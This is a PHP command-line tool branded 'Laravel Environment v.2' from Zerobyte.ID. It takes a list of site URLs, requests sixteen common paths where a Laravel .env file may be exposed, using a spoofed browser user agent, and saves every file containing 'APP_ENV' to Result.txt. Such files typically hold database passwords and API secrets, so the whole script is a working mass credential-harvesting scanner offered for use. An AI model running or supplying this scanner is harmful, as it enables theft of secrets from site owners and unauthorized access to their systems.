<?php
function copyright()
{
    /*
    https://zerobyte.id/
    Recoded? only changed and delete copyright? Don't be a bastard dude!
    */
    system('clear');
    echo "
    __                                __
   / /   ____ __________ __   _____  / /
  / /   / __ `/ ___/ __ `/ | / / _ \/ / 
 / /___/ /_/ / /  / /_/ /| |/ /  __/ /  
/_____/\__,_/_/   \__,_/ |___/\___/_/ Environment v.2" . PHP_EOL;
echo " 	                 Zerobyte.ID" . PHP_EOL;
    
}
copyright();
$grey  = "\e[37m";
$green = "\e[92m";
echo PHP_EOL . "Enter Your List : ";
$url      = trim(fgets(STDIN));
$kontorus = file_get_contents($url);
$urls     = explode("\n", $kontorus);
foreach ($urls as $list) {
    $config = array(
        "/.env",
        "/vendor/.env",
        "/lib/.env",
        "/lab/.env",
        "/cronlab/.env",
        "/cron/.env",
        "/core/.env",
        "/core/app/.env",
        "/core/Datavase/.env",
        "/database/.env",
        "/config/.env",
        "/assets/.env",
        "/app/.env",
        "/apps/.env",
        "/uploads/.env",
        "/sitemaps/.env"
    );
    foreach ($config as $path) {
        $shell = explode(PHP_EOL, $list);
        for ($x = 0; $x < $path; $x++);
        $site = $list . $path;
        $ch   = curl_init($site);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36");
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $ini_curl = curl_exec($ch);
        curl_close($ch);
        if (strpos($ini_curl, "APP_ENV")) {
            echo $green . "[+] " . $site . " => Found Config [OK]\033[0m" . PHP_EOL;
            $save = fopen("Result.txt", "a");
            fwrite($save, $ini_curl . PHP_EOL);
            fclose($save);
        } else {
            echo $grey . "[-] " . $site . " => [Config Not Found]\033[0m" . PHP_EOL;
        }
        
    }
}
?>
